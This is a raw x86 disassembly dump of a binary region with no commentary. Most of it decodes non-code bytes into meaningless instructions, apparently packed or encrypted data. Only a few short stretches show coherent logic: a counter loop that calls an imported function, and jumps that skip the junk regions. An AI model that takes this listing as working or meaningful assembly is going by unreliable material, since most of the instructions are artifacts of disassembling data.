  411f1b:	jbe    0x411ee4
  411f1d:	sbb    DWORD PTR ds:0x99c11673,esp
  411f23:	jle    0x411f65
  411f25:	outs   dx,DWORD PTR ds:[esi]
  411f26:	mov    ds:0xaa4f7f69,eax
  411f2b:	mov    ds:0xf8ac54da,eax
  411f30:	fdiv   DWORD PTR [edi*1+0x4102bf9b]
  411f37:	imul   esp,DWORD PTR [eax-0x3f651ac3],0x7f0f3274
  411f41:	sar    DWORD PTR [edx+0x3c],1
  411f44:	add    ecx,eax
  411f46:	pop    edx
  411f47:	dec    edx
  411f48:	(bad)  
  411f49:	jb     0x411f20
  411f4b:	aam    0xc5
  411f4d:	mov    BYTE PTR [esi],bh
  411f4f:	and    edx,0xc32e4e86
  411f55:	inc    esp
  411f56:	xor    dl,0xea
  411f59:	jae    0x411efd
  411f5b:	cld    
  411f5c:	js     0x411ef4
  411f5e:	add    bl,bh
  411f60:	jno    0x411fdf
  411f62:	sbb    BYTE PTR [ebp+eax*1-0x22],ch
  411f66:	dec    eax
  411f67:	mov    WORD PTR [ecx],fs
  411f69:	(bad)  
  411f6a:	jg     0x411f7a
  411f6c:	sub    ebx,esp
  411f6e:	cmp    eax,0x367a0b62
  411f73:	cmp    eax,0x8c1017f0
  411f78:	cmp    dl,bl
  411f7a:	sbb    eax,DWORD PTR [edi+edi*2-0xe]
  411f7e:	repnz and BYTE PTR [ebx],0xa5
  411f82:	cmp    bh,BYTE PTR [ecx+0x67c7dd11]
  411f88:	push   ss
  411f89:	dec    esi
  411f8a:	dec    ebp
  411f8b:	push   esp
  411f8c:	push   DWORD PTR [esi*4+0x746caa67]
  411f93:	ror    DWORD PTR [eax+ebp*8-0x4e],cl
  411f97:	push   eax
  411f98:	add    al,BYTE PTR [esi]
  411f9a:	out    dx,eax
  411f9b:	mov    eax,0xb3997ad2
  411fa0:	inc    esi
  411fa1:	inc    ebp
  411fa2:	lods   al,BYTE PTR ds:[esi]
  411fa3:	dec    esi
  411fa4:	dec    esp
  411fa5:	push   0x669bc02b
  411faa:	xchg   edi,eax
  411fab:	jb     0x411fd3
  411fad:	or     BYTE PTR [ecx+0x2fb9da5],0x6
  411fb4:	sbb    DWORD PTR [edx+0x7d98e8cf],esi
  411fba:	mov    eax,0x320cb004
  411fbf:	dec    edx
  411fc0:	mov    BYTE PTR [ebp-0x10785067],bl
  411fc6:	mov    ecx,ecx
  411fc8:	lock mov eax,0xef1d5109
  411fce:	cwde   
  411fcf:	aaa    
  411fd0:	jmp    0x411f70
  411fd2:	loopne 0x411fab
  411fd4:	push   0x36
  411fd6:	pusha  
  411fd7:	push   0x786f3157
  411fdc:	aas    
  411fdd:	mov    al,ds:0x4737c29f
  411fe2:	push   edx
  411fe3:	push   edx
  411fe4:	test   al,0x84
  411fe6:	stos   BYTE PTR es:[edi],al
  411fe7:	mov    ds:0xaffec897,al
  411fec:	cmp    DWORD PTR [esi],eax
  411fee:	inc    edx
  411fef:	dec    edi
  411ff0:	inc    ebx
  411ff1:	sub    DWORD PTR [esi],ecx
  411ff3:	icebp  
  411ff4:	das    
  411ff5:	push   es
  411ff6:	(bad)  
  411ff7:	retf   0x2a1f
  411ffa:	fld    TBYTE PTR [eax+0x59]
  411ffd:	int3   
  411ffe:	sub    al,0x69
  412000:	mov    ecx,0x7300d34d
  412005:	mov    dh,0x4d
  412007:	dec    esp
  412008:	adc    DWORD PTR [ecx-0x34],eax
  41200b:	call   0x47a1:0x402e32a9
  412012:	jmp    0xe296:0xc7686618
  412019:	std    
  41201a:	lods   eax,DWORD PTR ds:[esi]
  41201b:	jae    0x411f9d
  41201d:	ins    BYTE PTR es:[edi],dx
  41201e:	mov    ebp,0xc3719ffe
  412023:	pusha  
  412024:	addr16 xchg ebp,eax
  412026:	adc    BYTE PTR ds:[edi+0x5f],bl
  41202a:	cdq    
  41202b:	mov    edx,DWORD PTR [edi-0x4ffa7898]
  412031:	shr    DWORD PTR [eax+0x4ad91bc0],cl
  412037:	sub    eax,0x4f1fd46f
  41203c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41203d:	pop    edx
  41203e:	outs   dx,BYTE PTR ds:[esi]
  41203f:	fidivr WORD PTR [edi-0xe]
  412042:	inc    ebp
  412043:	xor    eax,0xcb84686e
  412048:	mov    al,0x1f
  41204a:	imul   esp,DWORD PTR [edi+0x110a2752],0xffffffbd
  412051:	sti    
  412052:	aam    0xc2
  412054:	bound  ebx,QWORD PTR [edx]
  412056:	mov    ebx,0x39c94c74
  41205b:	arpl   WORD PTR [ebx+0x747dee57],di
  412061:	nop
  412062:	nop
  412063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412064:	adc    cl,BYTE PTR [ecx-0x29]
  412067:	mov    ebp,DWORD PTR [eax+0x5e24b705]
  41206d:	inc    edx
  41206e:	rcl    BYTE PTR [eax],cl
  412070:	fs pop ds
  412072:	(bad)  
  412073:	pop    esp
  412074:	mov    edi,DWORD PTR [eax]
  412076:	ins    BYTE PTR es:[edi],dx
  412077:	das    
  412078:	(bad)  
  412079:	push   ebx
  41207a:	and    cl,BYTE PTR [esi]
  41207c:	test   eax,0x485ea40f
  412081:	aas    
  412082:	mov    ebx,DWORD PTR [ecx]
  412084:	xchg   ebx,eax
  412085:	inc    ecx
  412086:	dec    edx
  412087:	cs (bad) 
  412089:	(bad)  
  41208a:	pop    eax
  41208b:	cmp    DWORD PTR [eax],0x0
  41208e:	add    dl,cl
  412090:	(bad)  
  412091:	popa   
  412092:	test   BYTE PTR [edi],dl
  412094:	lods   eax,DWORD PTR ds:[esi]
  412095:	rcr    ch,0xd4
  412098:	jb     0x412096
  41209a:	adc    ch,BYTE PTR [eax+0x39594fa5]
  4120a0:	xchg   edx,eax
  4120a1:	mov    WORD PTR [ecx+0x12],cs
  4120a4:	jmp    0x412111
  4120a6:	push   es
  4120a7:	js     0x41204e
  4120a9:	mov    eax,DWORD PTR [ebp+0x8]
  4120ac:	mov    eax,DWORD PTR [eax]
  4120ae:	mov    ecx,DWORD PTR ds:0x41b224
  4120b4:	add    DWORD PTR [eax],ecx
  4120b6:	pop    esi
  4120b7:	pop    ebp
  4120b8:	ret    0x8
  4120bb:	push   ebp
  4120bc:	mov    ebp,esp
  4120be:	sub    esp,0x30
  4120c1:	and    ecx,DWORD PTR ds:0x42fd76
  4120c7:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  4120ce:	mov    eax,ds:0x42fcd5
  4120d3:	adc    DWORD PTR ds:0x42e6ef,eax
  4120d9:	mov    DWORD PTR [ebp-0x18],0xf89c8530
  4120e0:	sbb    DWORD PTR ds:0x42e6eb,0x6a34
  4120ea:	mov    ecx,DWORD PTR [ebp-0x4]
  4120ed:	sub    DWORD PTR ds:0x42e703,0x730a
  4120f7:	push   ebx
  4120f8:	mov    DWORD PTR ds:0x42e6fb,0x19
  412102:	cmp    DWORD PTR ds:0x42e6fb,0x0
  412109:	je     0x412140
  41210f:	cmp    DWORD PTR ds:0x42e6fb,0x1e
  412116:	jne    0x41212e
  41211c:	push   0x42fd7e
  412121:	push   0x0
  412123:	push   0x42e26d
  412128:	call   DWORD PTR ds:0x42e483
  41212e:	mov    ebx,DWORD PTR ds:0x42e6fb
  412134:	dec    ebx
  412135:	mov    DWORD PTR ds:0x42e6fb,ebx
  41213b:	jmp    0x412102
  412140:	mov    eax,0x7510855
  412145:	xor    ecx,eax
  412147:	sub    ebx,0x2eeb
  41214d:	mov    ebx,0x32729c
  412152:	sbb    DWORD PTR ds:0x42e120,0x42fd01
  41215c:	jmp    0x412440
  412161:	mov    edx,0xf222c858
  412166:	mov    dl,0x6a
  412168:	pop    eax
  412169:	dec    eax
  41216a:	xor    bh,0xa0
  41216d:	in     eax,dx
  41216e:	test   eax,0x5f46a219
  412173:	jo     0x4121e5
  412175:	mov    ecx,0xe170707e
  41217a:	pushf  
  41217b:	cmp    ch,al
  41217d:	imul   ecx,DWORD PTR [ecx],0xfffffff4
  412180:	test   al,0x7c
  412182:	into   
  412183:	outs   dx,BYTE PTR cs:[esi]
  412185:	push   esi
  412186:	int3   
  412187:	mov    esp,0x250aea9f
  41218c:	ret    0x946e
  41218f:	pop    es
  412190:	sti    
  412191:	and    ebx,ebp
  412193:	pop    ebp
  412194:	fdiv   st(7),st
  412196:	inc    esi
  412197:	pop    es
  412198:	mov    bl,BYTE PTR [ecx+edi*4+0x5ce1543]
  41219f:	jb     0x41214f
  4121a1:	loopne 0x4121e4
  4121a3:	sub    BYTE PTR [ebx-0x4fe4b50f],dl
  4121a9:	clc    
  4121aa:	inc    esp
  4121ab:	mov    ds:0xab521c64,eax
  4121b0:	retf   0x4eb7
  4121b3:	adc    DWORD PTR [ebp+0xa77c214],0x1d
  4121ba:	cmp    eax,0x27f1e2cf
  4121bf:	aas    
  4121c0:	aad    0x57
  4121c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4121c3:	xchg   ebx,eax
  4121c4:	mul    dl
  4121c6:	inc    ebx
  4121c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121c8:	xchg   edx,eax
  4121c9:	pop    edi
  4121ca:	das    
  4121cb:	adc    eax,0xa7f729ab
  4121d0:	jmp    0xae47:0x1d2bc00b
  4121d7:	popf   
  4121d8:	into   
  4121d9:	jne    0x41224c
  4121db:	in     eax,dx
  4121dc:	adc    BYTE PTR [edi+edx*1],ch
  4121df:	mov    cl,0x41
  4121e1:	mov    edx,0xc685632c
  4121e6:	in     eax,dx
  4121e7:	lods   eax,DWORD PTR ds:[esi]
  4121e8:	mov    ah,0xfb
  4121ea:	mov    es,WORD PTR [ecx+0x67]
  4121ed:	out    dx,al
  4121ee:	lahf   
  4121ef:	xchg   ebx,eax
  4121f0:	push   0x68
  4121f2:	xchg   ebp,eax
  4121f3:	mov    BYTE PTR [edx-0x54db54d1],0x94
  4121fa:	and    BYTE PTR [eax-0x6f],cl
  4121fd:	(bad)  
  4121fe:	dec    ebx
  4121ff:	scas   al,BYTE PTR es:[edi]
  412200:	mov    dh,0x6d
  412202:	cmp    eax,0x29f1cca0
  412207:	mov    DWORD PTR [eax+eax*4+0x49a60376],eax
  41220e:	int3   
  41220f:	or     bl,al
  412211:	pop    esp
  412212:	add    eax,eax
  412214:	mov    eax,0xdeeb3f1e
  412219:	push   ecx
  41221a:	aam    0xaf
  41221c:	push   0xfffffffe
  41221e:	popf   
  41221f:	sub    dl,0xdd
  412222:	sbb    ch,bl
  412224:	out    dx,eax
  412225:	ins    DWORD PTR es:[edi],dx
  412226:	inc    ebx
  412227:	repnz sub al,0xa7
  41222a:	add    cl,BYTE PTR [edi+0x7ecaf00d]
  412230:	jne    0x4121d9
  412232:	mov    ah,0xf8
  412234:	mov    ch,0x99
  412236:	lods   al,BYTE PTR ds:[esi]
  412237:	out    dx,al
  412238:	(bad)  
  41223a:	cld    
  41223b:	out    dx,eax
  41223c:	xchg   ebp,eax
  41223d:	in     eax,dx
  41223e:	sbb    DWORD PTR [ebx],esi
  412240:	inc    edx
  412241:	pop    ebp
  412242:	add    ebp,DWORD PTR [ebx+0x676f064]
  412248:	sbb    ah,ch
  41224a:	rcr    BYTE PTR [edx],cl
  41224c:	aas    
  41224d:	mov    cl,0xb1
  41224f:	inc    eax
  412250:	(bad)  
  412251:	loop   0x4121eb
  412253:	fcomip st,st(4)
  412255:	int3   
  412256:	loope  0x4122c8
  412258:	add    BYTE PTR [ebp-0x1d6cc623],ah
  41225e:	push   0xfa00cfec
  412263:	imul   ebp,ebx,0x3
  412266:	loopne 0x4122d1
  412268:	jl     0x412283
  41226a:	inc    esi
  41226b:	pop    eax
  41226c:	stc    
  41226d:	ins    BYTE PTR es:[edi],dx
  41226e:	ins    BYTE PTR es:[edi],dx
  41226f:	mov    ebx,DWORD PTR ds:0x3aa9e51d
  412275:	call   0xe13b5bd0
  41227a:	jae    0x41229e
  41227c:	push   ss
  41227d:	dec    edx
  41227e:	cdq    
  41227f:	in     eax,dx
  412280:	fimul  WORD PTR [ecx+0x47]
  412283:	lods   eax,DWORD PTR ds:[esi]
  412284:	mov    ds:0xf2d35565,eax
  412289:	inc    esp
  41228a:	mov    edx,0x773f83b4
  41228f:	mov    esi,0xa14e1378
  412294:	mov    ecx,0x7622a6d6
  412299:	or     cl,dh
  41229b:	aad    0x88
  41229d:	mov    ecx,0xa824347e
  4122a2:	pusha  
  4122a3:	jge    0x4122f1
  4122a5:	std    
  4122a6:	xchg   ecx,eax
  4122a7:	aad    0x88
  4122a9:	fadd   DWORD PTR [eax]
  4122ab:	add    eax,0xc6b9305
  4122b0:	xchg   ecx,eax
  4122b1:	je     0x412322
  4122b3:	jl     0x412239
  4122b5:	cmp    BYTE PTR [eax+0x6a],al
  4122b8:	mov    BYTE PTR [ebp-0xa],ah
  4122bb:	push   esi
  4122bc:	sub    BYTE PTR [eax+0x25357c8b],0xc
  4122c3:	out    dx,eax
  4122c4:	mov    dh,dl
  4122c6:	or     esi,DWORD PTR [ebp+0x2c]
  4122c9:	iret   
  4122ca:	imul   esp,DWORD PTR [edx],0xffffffd6
  4122cd:	cs loope 0x412321
  4122d0:	mov    bh,0x34
  4122d2:	jns    0x412334
  4122d4:	cwde   
  4122d5:	je     0x4122b5
  4122d7:	jg     0x412273
  4122d9:	or     esp,esi
  4122db:	(bad)  
  4122dc:	int    0x31
  4122de:	ins    DWORD PTR es:[edi],dx
  4122df:	lods   al,BYTE PTR ds:[esi]
  4122e0:	scas   al,BYTE PTR es:[edi]
  4122e1:	mov    ecx,0xa57eeaf3
  4122e6:	cwde   
  4122e7:	(bad)  
  4122e8:	push   es
  4122e9:	xchg   edi,eax
  4122ea:	cli    
  4122eb:	xchg   esp,eax
  4122ec:	pushf  
  4122ed:	mov    dh,0xfb
  4122ef:	adc    edx,DWORD PTR [ebp-0x2d238519]
  4122f5:	sahf   
  4122f6:	or     edx,DWORD PTR [ebp+0x35]
  4122f9:	fwait
  4122fa:	(bad)  
  4122fd:	les    ecx,FWORD PTR [ecx+ebp*1-0x65df49cd]
  412304:	sti    
  412305:	pop    ecx
  412306:	lds    edi,FWORD PTR [ebx-0x47]
  412309:	inc    ebp
  41230a:	add    edi,ebx
  41230c:	test   al,0x74
  41230e:	adc    dl,BYTE PTR [ebx-0x22fad90b]
  412314:	std    
  412315:	mov    esi,0x1fd1df22
  41231a:	adc    cl,BYTE PTR [esi]
  41231c:	popf   
  41231d:	pop    edx
  41231e:	out    dx,al
  41231f:	add    BYTE PTR [ebx-0x2cb02fbd],dh
  412325:	mov    dh,BYTE PTR [eax]
  412327:	mov    dl,0xab
  412329:	idiv   bl
  41232b:	dec    eax
  41232c:	jne    0x412386
  41232e:	xor    DWORD PTR [eax+edx*2],0x85b91237
  412335:	leave  
  412336:	cmp    al,0x63
  412338:	das    
  412339:	pusha  
  41233a:	sub    dl,BYTE PTR [edx-0x1611cda4]
  412340:	mov    eax,0xa004def
  412345:	push   0xffffffa3
  412347:	xor    ebp,DWORD PTR [eax]
  412349:	popa   
  41234a:	es leave 
  41234c:	ss xchg ebp,eax
  41234e:	pop    ecx
  41234f:	jnp    0x412353
  412351:	repz xlat BYTE PTR ds:[ebx]
  412353:	hlt    
  412354:	sub    eax,DWORD PTR [esi+0x42cb4d57]
  41235a:	retf   0xd161
  41235d:	arpl   cx,ax
  41235f:	push   ds
  412360:	xchg   BYTE PTR [ebp-0x1acd6ef3],cl
  412366:	sub    cl,BYTE PTR [edi]
  412368:	pop    esp
  412369:	(bad)  [ecx]
  41236b:	arpl   WORD PTR [eax],bp
  41236d:	in     al,0xc8
  41236f:	ret    0xcc90
  412372:	vandps ymm7,ymm2,YMMWORD PTR [ecx-0x17]
  412377:	pushf  
  412378:	mov    al,0xbb
  41237a:	mov    ?,ecx
  41237c:	add    ebp,DWORD PTR [esp+eax*4]
  41237f:	loope  0x4123e0
  412381:	aas    
  412382:	or     dh,BYTE PTR [edi-0x754152fd]
  412388:	or     eax,0xb5b3b05c
  41238d:	xchg   bx,ax
  41238f:	sti    
  412390:	arpl   bx,bp
  412392:	xchg   esp,eax
  412393:	aam    0x83
  412395:	xchg   edi,eax
  412396:	loop   0x4123e2
  412398:	mov    eax,0x2f1f90b0
  41239d:	mov    ?,WORD PTR [eax+0x7f6f4a46]
  4123a3:	shl    BYTE PTR [ecx+0x3],0xaf
  4123a7:	mov    esi,0x6431807
  4123ac:	sbb    al,0x8a
  4123ae:	int    0xd0
  4123b0:	jecxz  0x4123ad
  4123b2:	xlat   BYTE PTR ds:[ebx]
  4123b3:	ss fcmovbe st,st(4)
  4123b6:	std    
  4123b7:	sub    ebx,DWORD PTR [eax+0x1a]
  4123ba:	pop    es
  4123bb:	xor    al,0xdf
  4123bd:	sbb    bh,BYTE PTR [esi]
  4123bf:	and    BYTE PTR [ebx-0x5d],dl
  4123c2:	out    dx,al
  4123c3:	fstp   DWORD PTR [edi-0x4b7ef2ae]
  4123c9:	sub    bl,BYTE PTR [edx+ebp*1]
  4123cc:	xor    al,0xa
  4123ce:	mov    edx,0xec7d275
  4123d3:	in     eax,dx
  4123d4:	xor    al,BYTE PTR [ecx-0x73]
  4123d7:	or     dh,BYTE PTR [ecx-0x124ebc08]
  4123dd:	sbb    BYTE PTR [ecx-0x72],bl
  4123e0:	(bad)  
  4123e1:	into   
  4123e2:	push   ebx
  4123e3:	add    bh,dl
  4123e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123e6:	mov    edx,0x828d8f43
  4123eb:	shl    DWORD PTR [esi+0x4ed89169],0x85
  4123f2:	(bad)  
  4123f3:	and    BYTE PTR [eax],dh
  4123f5:	xchg   ebx,eax
  4123f6:	adc    al,0xf
  4123f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4123f9:	mov    edi,0xc39128f9
  4123fe:	lods   al,BYTE PTR ds:[esi]
  4123ff:	adc    dh,dh
  412401:	div    DWORD PTR [edx]
  412403:	xchg   ebp,eax
  412404:	sbb    ch,BYTE PTR [edi]
  412406:	push   ebx
  412407:	jb     0x4123cd
  412409:	dec    ecx
  41240a:	push   eax
  41240b:	lahf   
  41240c:	xor    esp,DWORD PTR [ebx]
  41240e:	push   es
  41240f:	in     eax,0xac
  412411:	bound  edi,QWORD PTR [eax]
  412413:	int3   
  412414:	inc    ecx
  412415:	call   0xd5578164
  41241a:	icebp  
  41241b:	mov    al,0x45
  41241d:	popa   
  41241e:	daa    
  41241f:	sub    eax,esi
  412421:	outs   dx,DWORD PTR ds:[esi]
  412422:	inc    ecx
  412423:	adc    edx,DWORD PTR [eax-0x5e]
  412426:	call   0x7c01a747
  41242b:	sub    BYTE PTR [eax],ah
  41242d:	test   eax,0x96e7bf7a
  412432:	clc    
  412433:	hlt    
  412434:	push   edx
  412435:	fisttp WORD PTR [edx]
  412437:	les    esp,FWORD PTR [eax+0x64]
  41243a:	and    DWORD PTR [edi],eax
  41243c:	add    al,BYTE PTR [edi]
  41243e:	jnp    0x4123c0
  412440:	add    ecx,ebx
  412442:	sub    DWORD PTR ds:0x42fcf9,0xf96
  41244c:	jmp    0x412730
  412451:	hlt    
  412452:	xor    BYTE PTR [ebx+edi*8+0x74],bl
  412456:	fwait
  412457:	repz ja 0x41244c
  41245a:	inc    ecx
  41245b:	xchg   ecx,eax
  41245c:	aaa    
  41245d:	mov    dh,BYTE PTR [eax+0x5c8f07ee]
  412463:	jo     0x4124d5
  412465:	mov    ecx,0x5170707e
  41246a:	mov    WORD PTR [edi+0x18],fs
  41246d:	xchg   ebx,eax
  41246e:	fidivr WORD PTR [ebp-0x2e]
  412471:	inc    edx
  412472:	mov    ch,0x38
  412474:	stc    
  412475:	push   0x1f8fe236
  41247a:	adc    dh,BYTE PTR [esi-0x447b9c0]
  412480:	push   edi
  412481:	leave  
  412482:	std    
  412483:	mov    ebx,0x1ce117d6
  412488:	mov    WORD PTR [esi+0x3e],?
  41248b:	enter  0x6b3f,0xa8
  41248f:	aam    0x1d
  412491:	fcomp  DWORD PTR es:[esp+ebp*4+0x57709d12]
  412499:	mov    dl,0xc9
  41249b:	or     eax,0xb20fb2c5
  4124a0:	in     eax,dx
  4124a1:	out    0x2f,eax
  4124a3:	inc    esp
  4124a4:	repnz and DWORD PTR [edi-0x161f8f63],0xf05d4bc1
  4124af:	test   BYTE PTR [ebx+0x3e],ah
  4124b2:	test   eax,0xe779bc36
  4124b7:	dec    edi
  4124b8:	and    eax,0xc8ee1ce1
  4124bd:	loope  0x4124ea
  4124bf:	inc    ecx
  4124c0:	dec    ebx
  4124c1:	xchg   ebx,edi
  4124c3:	bound  edi,QWORD PTR [esi-0x553a2ba]
  4124c9:	push   ecx
  4124ca:	sar    BYTE PTR [esi+0x6c361439],1
  4124d0:	mov    esi,0xbe439d7d
  4124d5:	in     al,dx
  4124d6:	mov    ebp,0xa5ed0970
  4124db:	les    esp,FWORD PTR [eax]
  4124dd:	and    eax,0xbf28e109
  4124e2:	fs and al,0x23
  4124e5:	inc    ebx
  4124e6:	mul    dl
  4124e8:	add    BYTE PTR [ebx+ebp*4],ch
  4124eb:	pop    esp
  4124ec:	retf   
  4124ed:	shr    DWORD PTR [eax+0x7347aa21],cl
  4124f3:	test   BYTE PTR [edi-0x45],0xd9
  4124f7:	jbe    0x4124ec
  4124f9:	fwait
  4124fa:	cmp    eax,DWORD PTR [edi]
  4124fc:	mov    DWORD PTR [eax+0x527be205],ecx
  412502:	inc    edx
  412503:	aas    
  412504:	sti    
  412505:	xor    BYTE PTR [ecx],ah
  412507:	(bad)  
  412508:	imul   edi,DWORD PTR [ebp+eax*2+0x20],0xb
  41250d:	inc    ecx
  41250e:	fmul   QWORD PTR [ebx-0x20]
  412511:	scas   eax,DWORD PTR es:[edi]
  412512:	xor    ah,al
  412514:	xchg   esp,edx
  412516:	and    eax,0xf79ddecd
  41251b:	push   es
  41251c:	sbb    esi,ebx
  41251e:	mov    ecx,ebx
  412520:	add    esp,ecx
  412522:	xor    edi,DWORD PTR [ebp-0xa]
  412525:	lahf   
  412526:	pop    edx
  412527:	mov    cs,WORD PTR [ecx+0x1a160bb1]
  41252d:	pop    edx
  41252e:	mov    bl,0x78
  412530:	cmp    eax,0x90076cf1
  412535:	mov    ebp,0xe5f667ce
  41253a:	jb     0x4124da
  41253c:	inc    esi
  41253d:	sbb    al,0x58
  41253f:	mov    esp,DWORD PTR [edi-0x6ff70dac]
  412545:	adc    eax,DWORD PTR [edi]
  412547:	cld    
  412548:	inc    edx
  412549:	push   0x2e
  41254b:	(bad)  
  41254c:	mov    BYTE PTR [ebp-0x74017046],dh
  412552:	mov    cl,0xf
  412554:	es jecxz 0x41253f
  412557:	(bad)  
  412558:	pop    edx
  412559:	jp     0x4125b7
  41255b:	out    dx,al
  41255c:	pop    ebx
  41255d:	int3   
  41255e:	jns    0x412524
  412560:	sbb    dl,BYTE PTR [esi+edi*8]
  412563:	xchg   esi,eax
  412564:	mov    ecx,0xde1f82b4
  412569:	inc    eax
  41256a:	xchg   edx,eax
  41256b:	lods   eax,DWORD PTR ds:[esi]
  41256c:	int3   
  41256d:	rcr    BYTE PTR [edx-0x10dd7d62],1
  412573:	inc    ebx
  412574:	rcl    DWORD PTR [esi+edi*4-0x70],1
  412578:	mov    dh,0x37
  41257a:	or     edi,DWORD PTR [eax-0x67effdc4]
  412580:	fnsave [edi+eax*1]
  412583:	mov    ebp,0x4376318a
  412588:	mov    bh,0xcc
  41258a:	dec    esp
  41258b:	xchg   edx,eax
  41258c:	add    BYTE PTR [ebp-0x1f],bh
  41258f:	pop    edi
  412590:	inc    ecx
  412591:	pop    ecx
  412592:	and    DWORD PTR [eax-0x70],eax
  412595:	enter  0x9ac8,0xaa
  412599:	mov    bh,0x4b
  41259b:	das    
  41259c:	sbb    bp,WORD PTR [ebp-0xd93f062]
  4125a3:	cld    
  4125a4:	mov    dl,0x37
  4125a6:	mov    esi,0xfe7d8396
  4125ab:	sub    DWORD PTR [ebp-0x17],eax
  4125ae:	fstp   TBYTE PTR [edi+0x55a196a2]
  4125b4:	mov    bh,dl
  4125b6:	xor    BYTE PTR [eax+0x22],0xf1
  4125ba:	sub    ax,0x1b88
  4125be:	jle    0x4125fe
  4125c0:	pop    ebp
  4125c1:	ins    DWORD PTR es:[edi],dx
  4125c2:	lods   al,BYTE PTR ds:[esi]
  4125c3:	mov    ?,WORD PTR fs:[eax+0x1d2d39b4]
  4125ca:	jns    0x4125a5
  4125cc:	push   edx
  4125cd:	mov    ebp,0xab5be894
  4125d2:	xchg   esp,eax
  4125d3:	mov    cl,0x70
  4125d5:	cmp    BYTE PTR [edi-0x5a524edd],bh
  4125db:	fsub   QWORD PTR [esi+edi*1+0x7660d70e]
  4125e2:	jl     0x41258f
  4125e4:	pushf  
  4125e5:	stos   BYTE PTR es:[edi],al
  4125e6:	mov    edi,0xf9b1c8fa
  4125eb:	dec    esp
  4125ec:	shl    BYTE PTR [ebx],0xf9
  4125ef:	mov    BYTE PTR [eax+eax*4-0x35],al
  4125f3:	mov    ebx,0x1c173091
  4125f8:	mov    ebp,0x4c730a20
  4125fd:	nop
  4125fe:	dec    ecx
  4125ff:	ja     0x41263a
  412601:	sbb    esi,0xffffff85
  412604:	jg     0x412669
  412606:	xchg   ebp,eax
  412607:	stc    
  412608:	mov    ebp,ebx
  41260a:	int3   
  41260b:	test   DWORD PTR [ecx],edi
  41260d:	enter  0xf1be,0xf
  412611:	das    
  412612:	mov    dl,0x81
  412614:	sar    BYTE PTR [ebx+0xe],0xf1
  412618:	cmp    al,0x4b
  41261a:	aam    0x2c
  41261c:	jbe    0x412676
  41261e:	popf   
  41261f:	sub    BYTE PTR [eax+0x44872b6b],bl
  412625:	or     eax,0x84a0bfa7
  41262a:	xcrypt-ecb (bad)
  41262b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41262c:	or     DWORD PTR [edx-0x7e],esi
  41262f:	sub    esi,edi
  412631:	mov    esi,0x27535b6b
  412636:	or     eax,0x29415a2f
  41263b:	cmp    cl,BYTE PTR [ebp-0x7a645d94]
  412641:	retf   0x33d0
  412644:	jecxz  0x4125db
  412646:	mov    ebp,DWORD PTR ds:0xc7628bb1
  41264c:	mov    ds:0xb9845c91,al
  412651:	into   
  412652:	push   edi
  412653:	dec    edi
  412654:	jne    0x41260f
  412656:	rcr    DWORD PTR ds:0x55de71d9,0x82
  41265d:	sub    al,0x8c
  41265f:	add    al,ah
  412661:	xchg   DWORD PTR [ebp+0x28bf25c0],ebp
  412667:	push   edx
  412668:	xchg   ebp,eax
  412669:	mov    ecx,ebp
  41266b:	inc    edi
  41266c:	out    dx,eax
  41266d:	xor    bh,BYTE PTR [edx]
  41266f:	push   ds
  412670:	lods   al,BYTE PTR ds:[esi]
  412671:	lods   al,BYTE PTR ds:[esi]
  412672:	in     al,dx
  412673:	neg    ecx
  412675:	adc    al,0x12
  412677:	cld    
  412678:	inc    esi
  412679:	outs   dx,DWORD PTR ds:[esi]
  41267a:	icebp  
  41267b:	push   edi
  41267c:	cli    
  41267d:	pop    esi
  41267e:	es cmp al,0xb8
  412681:	cdq    
  412682:	xchg   ebp,eax
  412683:	pop    es
  412684:	je     0x41261f
  412686:	lods   al,BYTE PTR ds:[esi]
  412687:	rol    DWORD PTR [ebx],1
  412689:	mov    eax,0x91348b0f
  41268e:	adc    dl,BYTE PTR [ebx-0x44ae5a0e]
  412694:	and    eax,0xa456b21a
  412699:	add    esi,eax
  41269b:	and    al,0x14
  41269d:	jne    0x4126de
  41269f:	push   esp
  4126a0:	pop    ecx
  4126a1:	add    bh,BYTE PTR [esi-0x2dd04a85]
  4126a7:	sbb    al,0xbb
  4126a9:	popa   
  4126aa:	jno    0x4126ca
  4126ac:	xchg   edi,eax
  4126ad:	xor    DWORD PTR [ebx],ebx
  4126af:	fdiv   DWORD PTR [edi]
  4126b1:	lahf   
  4126b2:	jmp    0xc169:0xde7ab407
  4126b9:	adc    DWORD PTR [esp+ecx*2-0x256b04cd],esi
  4126c0:	pop    edx
  4126c1:	clc    
  4126c2:	xchg   edx,eax
  4126c3:	xor    eax,0xb2cc807e
  4126c8:	outs   dx,BYTE PTR ds:[esi]
  4126c9:	ficom  DWORD PTR [ecx+0x7fd78668]
  4126cf:	sub    eax,0x504b5cb
  4126d4:	cs imul ebp,esp,0xf08ec0
  4126db:	xor    ebx,esp
  4126dd:	fstp   TBYTE PTR [ecx]
  4126df:	add    al,0xa4
  4126e1:	jmp    0x41271e
  4126e3:	ins    BYTE PTR es:[edi],dx
  4126e4:	pop    esi
  4126e6:	push   esp
  4126e7:	mov    esp,DWORD PTR [edx]
  4126e9:	rcr    DWORD PTR [ecx-0x4a3b7d79],1
  4126ef:	(bad)  
  4126f0:	jmp    0x1516:0x6038c064
  4126f7:	xor    al,0xe
  4126f9:	fstp   DWORD PTR [eax]
  4126fb:	or     DWORD PTR [esi],ebp
  4126fd:	popa   
  4126fe:	mov    dh,0x9b
  412700:	das    
  412701:	jnp    0x412747
  412703:	test   eax,0x40479fd7
  412708:	cmc    
  412709:	xor    ch,dh
  41270b:	jge    0x41276a
  41270d:	add    BYTE PTR [edi+0x69],0xc5
  412711:	mov    al,0x79
  412713:	jns    0x412760
  412715:	lahf   
  412716:	pop    ecx
  412717:	sub    DWORD PTR [edi-0x4b059aae],ebx
  41271d:	mov    dh,0x68
  41271f:	lock sti 
  412721:	fwait
  412722:	leave  
  412723:	jmp    0xdb6e4af0
  412728:	cmp    ah,BYTE PTR [edi]
  41272a:	daa    
  41272b:	adc    al,0xc8
  41272d:	adc    dl,0xb4
  412730:	mov    DWORD PTR [ebp-0x1c],ecx
  412733:	and    DWORD PTR ds:0x42fd76,0x0
  41273d:	jmp    0x412751
  412742:	xor    ecx,ecx
